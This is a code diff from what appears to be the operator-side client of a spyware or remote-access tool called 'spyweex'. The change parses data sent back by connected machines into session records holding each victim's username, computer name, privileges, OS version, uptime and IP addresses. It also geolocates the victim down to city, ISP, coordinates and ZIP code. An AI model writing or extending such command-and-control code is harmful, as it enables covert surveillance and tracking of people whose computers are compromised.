@@ -4,16 +4,20 @@ using System.Drawing;
 using System.IO;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 
 using System.Reactive.Concurrency;
 using System.Reactive.Linq;
+using System.Runtime.Serialization.Json;
 using System.Threading;
 using System.Windows.Threading;
 using spyweex_client_wpf.StaticStrings;
 using System.Windows;
 using System.Windows.Media.Imaging;
+using System.Xml.Linq;
+using System.Xml.XPath;
 
 namespace spyweex_client_wpf
 {
@@ -182,32 +186,49 @@ namespace spyweex_client_wpf
             isSubscribed = true;
             IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                 getObservableSequenceOfReponses().
-                ObserveOn(TaskPoolScheduler.Default).
+                ObserveOn(Scheduler.CurrentThread).
                 Subscribe(
                 response =>
                 {
-                    string data = response.content.ToString();
-                    string[] results = data.Split(new string[] { "%%" }, StringSplitOptions.None);
+
+                    Encoding enc = Encoding.GetEncoding("utf-8");
+                    string data = enc.GetString(response.content);
+
+                    var jsonReader = JsonReaderWriterFactory.CreateJsonReader(
+                        Encoding.Default.GetBytes(data), new System.Xml.XmlDictionaryReaderQuotas());
+                    var root = XElement.Load(jsonReader);
+
+                    IPEndPoint ipEndPoint = (IPEndPoint) wxhtpClient.getTcpClient().Client.RemoteEndPoint;
+                    string ip = ipEndPoint.Address.ToString();
+                    var tupleOfGeoData = Utils.GetGeoInfo("89.28.51.5");
+
+
                     Session s = new Session
                                 {
                                     ID = (viewModel.sessions.Count + 1).ToString(),
-                                    IP = wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(),
-                                    Username = results[0],
-                                    ComputerName = results[1],
-                                    Privileges = results[2],
-                                    OS = results[3],
-                                    Uptime = results[4],
-                                    Country = results[5], // get country by ip
-                                    Cam = results[5],
-                                    InstallDate = results[6]
-                                };
+                                    WANIP = wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(),
+                                    LOCALIP = root.XPathSelectElement("//local_ip").Value,
+                                    Username = root.XPathSelectElement("//username").Value,
+                                    ComputerName = root.XPathSelectElement("//comp_name").Value,
+                                    Privileges = root.XPathSelectElement("//privs").Value,
+                                    OS = root.XPathSelectElement("//win_ver").Value,
+                                    Uptime = root.XPathSelectElement("//uptime").Value,
+                                    Cam = "unknown",
+                                    InstallDate = "unknown",
+                                    Country = tupleOfGeoData.Item1,
+                                    RegionName = tupleOfGeoData.Item2,
+                                    City = tupleOfGeoData.Item3,
+                                    Isp = tupleOfGeoData.Item4,
+                                    Coords = tupleOfGeoData.Item5,
+                                    Zip = tupleOfGeoData.Item6
+                    };
                     viewModel.sessions.Add(s);
                     UnsubscribeAsync();
                 },
                 err =>
                 {
                     Debug.WriteLine((Exception)err);
-                    MessageBoxResult result = MessageBox.Show("Error occured in Command Promt Listener " + (Exception)err);
+                    MessageBoxResult result = MessageBox.Show("Error occured in ConnectionInfoListener " + (Exception)err);
                     UnsubscribeAsync();
                 }
 
